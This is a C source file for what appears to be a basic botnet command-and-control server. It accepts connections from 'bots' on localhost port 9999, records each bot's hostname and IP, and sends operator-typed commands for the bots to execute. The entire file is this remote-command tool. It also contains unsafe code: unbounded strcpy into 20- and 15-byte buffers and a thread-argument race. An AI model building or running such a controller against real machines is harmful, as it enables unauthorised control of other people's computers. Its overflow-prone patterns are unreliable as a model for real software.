#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <fcntl.h>
#include <pthread.h>
#define MAX 10240
#define PORT 9999
#define SA struct sockaddr

//We require a mutex to ask the user for input
//Mutex declared globally so that all threads can access
pthread_mutex_t lock;

//Target of the pthread_create function
void* socketThread( void* connfd)
{
    func(*((int*)connfd));
	pthread_exit(NULL);
    return NULL;
}

//The function which runs the communication
void func(int sockfd)
{
	char buff[MAX], hostname[20], ip[15];
	int n;
	//Accept the hostname from the bot
	bzero(buff, MAX);
	read(sockfd, buff, sizeof(buff));
	strcpy(hostname, buff);

	//Accept the IP from the bot
	bzero(buff, MAX);
	read(sockfd, buff, sizeof(buff));
	strcpy(ip,buff);
	for (;;) 
	{
		//Need to ensure that only one bot reads from STDIN
		//So we lock the mutex
        pthread_mutex_lock(&lock);
        printf("Command for (hostname: %s,ip address: %s, socket identifier: %d): ", hostname, ip, sockfd);
		bzero(buff, MAX);
		n = 0;
		while ((buff[n++] = getchar()) != '\n')
			;

		
		//Send the command to the bot to get executed
		write(sockfd, buff, sizeof(buff));

		//If the command was exit, exit the loop	
		if (strncmp("exit", buff, 4) == 0) 
		{
			printf("Server Exit...\n");
			break;
		}

		//Read the execution status sent by the bot
		bzero(buff,sizeof(buff));
		read(sockfd,buff,sizeof(buff));
		if(strcmp(buff,"Success") == 0)
        	printf("Command executed\n");
		else
			printf("Command Failure\n");

		//After reading from STDIN, we release the mutex
        pthread_mutex_unlock(&lock);

		sleep(1);
	}
	//Need to release before exit
	pthread_mutex_unlock(&lock);
}

int main()
{
	int sockfd, connfd, len;
	struct sockaddr_in servaddr, cli;

	// socket create and verification
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1) {
		printf("socket creation failed...\n");
		exit(0);
	}
	else
		printf("Socket successfully created..\n");
	bzero(&servaddr, sizeof(servaddr));

	// assign IP, PORT
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	servaddr.sin_port = htons(PORT);

	// Binding newly created socket to given IP and verification
	if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0) {
		printf("socket bind failed...\n");
		exit(0);
	}
	else
		printf("Socket successfully binded..\n");


	// Now server is ready to listen and verification
	if ((listen(sockfd, 5)) != 0) {
		printf("Listen failed...\n");
		exit(0);
	}
	else
		printf("Server listening..\n");
	len = sizeof(cli);



    pthread_t thread[50];
    pthread_mutex_init(&lock, NULL);
    int i=0;
	//Wait for connections to the socket
	while(1)
    {
		//Accepts a connection when a client connects
        connfd = accept(sockfd, (SA*)&cli, &len);
        if (connfd < 0) {
        
        printf("server acccept failed...\n");
        exit(0);
        }
        
        else
        {
			//Create a new thread to service the client
			//Continue listening for connections on the main thread
            if(pthread_create(&thread[i++], NULL, socketThread, &connfd) != 0)
            {
                printf("Failed to create thread\n");
            }   
        }      


    }
	// After chatting close the socket
	close(sockfd);
}

